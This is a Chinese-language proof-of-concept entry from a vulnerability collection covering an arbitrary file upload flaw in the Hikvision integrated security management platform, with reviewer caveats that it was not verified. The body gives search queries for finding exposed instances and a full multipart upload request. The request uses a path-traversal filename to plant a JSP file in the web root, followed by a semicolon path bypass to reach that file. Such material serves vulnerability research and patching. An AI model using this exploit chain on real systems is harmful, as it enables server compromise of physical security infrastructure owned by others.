---
source: "Threekiii/Awesome-POC"
id: "vw-55bfb068935a6f7a645248af"
entity_id: "ve-e94ae457a67734fefb7e4254"
schema_version: "1"
title: "Hikvision 综合安防管理平台 report 任意文件上传漏洞"
product: "Hikvision综合安防管理平台SVM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "Linux路径通过env泄露/已知获得，写权限/JSP解析；版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/HIKVISION%20%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20report%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留"
source_status: "unknown"
canonical: "Web安全/智能设备/HIKVISION-综合安防管理平台-report/HIKVISION-综合安防管理平台-report-任意文件上传漏洞.md"
relation_type: "duplicate_of"
---

# Hikvision 综合安防管理平台 report 任意文件上传漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Hikvision综合安防管理平台SVM
- 本文讨论：svm/api/external/report路径穿越上传
- 版本、权限与配置前提：Linux路径通过env泄露/已知获得，写权限/JSP解析；版本未知
- 资料类型：源码位置/上传PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- env泄露没有对应请求，不能将完整链标无需额外前提
- Java源码只给类路径与图片，其中serivce拼写需按原包核，别直接纠正
- 回读使用分号路径绕过，需明确其是否额外鉴权条件；与files不同服务
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留

### 待核与来源

- 源码/环境泄露路径/角色及修复待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

Hikvision 综合安防管理平台 report接口存在任意文件上传漏洞，攻击者通过构造特殊的请求包可以上传任意文件，获取服务器权限

## 漏洞影响

Hikvision 综合安防管理平台

## 网络测绘

```
app="Hikvision-综合安防管理平台"
```

```
web.title=="综合安防管理平台"
```

## 漏洞复现

登陆页面

![image-20220824134144287](./.resource/HIKVISION综合安防管理平台report任意文件上传漏洞/media/202208241341481.png)

```
WEB-INF/classes/com/Hikvision/svm/controller/ExternalController.class
```

![image-20230828163755020](./.resource/HIKVISION综合安防管理平台report任意文件上传漏洞/media/image-20230828163755020.png)

```
WEB-INF/classes/com/Hikvision/svm/business/serivce/impl/ExternalBusinessServiceImpl.class
```

![image-20230828163809686](./.resource/HIKVISION综合安防管理平台report任意文件上传漏洞/media/image-20230828163809686.png)

构造上传文件（通过 env泄漏获取绝对路径，路径一般不会修改）

```http
POST /svm/api/external/report HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/Hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip

<%out.print("test");%>

------WebKitFormBoundary9PggsiM755PLa54a--
```

![image-20230828163835117](./.resource/HIKVISION综合安防管理平台report任意文件上传漏洞/media/image-20230828163835117.png)

```
/portal/ui/login/..;/..;/new.jsp
```

![image-20230828163848482](./.resource/HIKVISION综合安防管理平台report任意文件上传漏洞/media/image-20230828163848482.png)


---

> 来源：Threekiii/Awesome-POC
